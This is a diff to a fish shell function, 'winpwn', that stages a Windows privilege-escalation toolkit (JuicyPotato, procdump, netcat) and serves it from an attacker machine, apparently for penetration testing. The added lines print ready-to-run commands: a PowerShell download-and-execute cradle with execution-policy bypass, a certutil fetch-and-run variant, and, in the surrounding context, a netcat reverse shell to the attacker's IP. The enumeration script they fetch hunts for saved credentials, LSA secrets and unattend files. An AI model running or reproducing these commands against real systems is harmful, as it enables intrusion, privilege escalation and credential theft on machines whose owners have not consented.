@@ -52,6 +52,7 @@ function winpwn --description "stage the windows privesc toolkit and serve it ov
     #   apim   a=repo|regex    b=member inside the archive
     #   local  a=kali path     b=fallback url
     #   manual a=why
+    #   gen    written by a rasbora function, refreshed on every run
     set -l tools \
         "jp64|JuicyPotato-x64.exe|url|$gh/ohpe/juicy-potato/releases/latest/download/JuicyPotato.exe|" \
         "jp32|JuicyPotato-x86.exe|manual|upstream ships x64 only, no official x86 build|" \
@@ -117,7 +118,8 @@ function winpwn --description "stage the windows privesc toolkit and serve it ov
         "pd64|procdump-x64.exe|zip|https://download.sysinternals.com/files/Procdump.zip|procdump64.exe" \
         "nc|nc-x86.exe|local|/usr/share/windows-resources/binaries/nc.exe|$gh/int0x33/nc.exe/raw/master/nc.exe" \
         "nc64|nc-x64.exe|local|/usr/share/windows-resources/binaries/nc64.exe|$gh/int0x33/nc.exe/raw/master/nc64.exe" \
-        "tcb|test_clsid.bat|url|https://raw.githubusercontent.com/ohpe/juicy-potato/master/Test/test_clsid.bat|"
+        "tcb|test_clsid.bat|url|https://raw.githubusercontent.com/ohpe/juicy-potato/master/Test/test_clsid.bat|" \
+        "post|post.ps1|gen|rasbora post-foothold enumeration, regenerated every run|"
 
     set -l wt "C:\Windows\Temp"      # kept in a var: "\$a" in a fish string eats the variable
 
@@ -166,7 +168,9 @@ function winpwn --description "stage the windows privesc toolkit and serve it ov
         set -l how $p[3]
         set -l dest $dir/$real
 
-        if test -f $dest
+        if test "$how" = gen
+            __winpwn_post $dest
+        else if test -f $dest
             # already staged, never re-download
         else
             switch $how
@@ -281,6 +285,15 @@ function winpwn --description "stage the windows privesc toolkit and serve it ov
     echo
     echo "  Service account with NO SeImpersonate FullPowers first, then a potato"
     echo "    fp.exe -c \"cmd /c nc.exe $ip 443 -e cmd\" -z"
+    echo
+
+    # ---- post-foothold enumeration ----------------------------------------
+    echo "  ── got a shell? post.ps1 first: privs verdict, pivot interfaces, localhost ports, profiles with hidden dirs, ──"
+    echo "  ── PS history, autologon incl. the LSA-secret case, windows.old, unattend, saved creds, services and tasks ACLs ──"
+    echo "    powershell -ep bypass -c \"iex (New-Object Net.WebClient).DownloadString('http://$ip:$port/post.ps1')\" > $wt\\post.txt"
+    echo "    certutil -urlcache -split -f http://$ip:$port/post.ps1 $wt\\post.ps1 && powershell -ep bypass -File $wt\\post.ps1 > $wt\\post.txt"
+    echo "    no download path at all: cat ~/tools/win/post.ps1, paste it into the shell"
+    echo "    bring post.txt home, it is the enumeration evidence for the report. type $wt\\post.txt"
     echo
 
     # ---- fetch commands ---------------------------------------------------
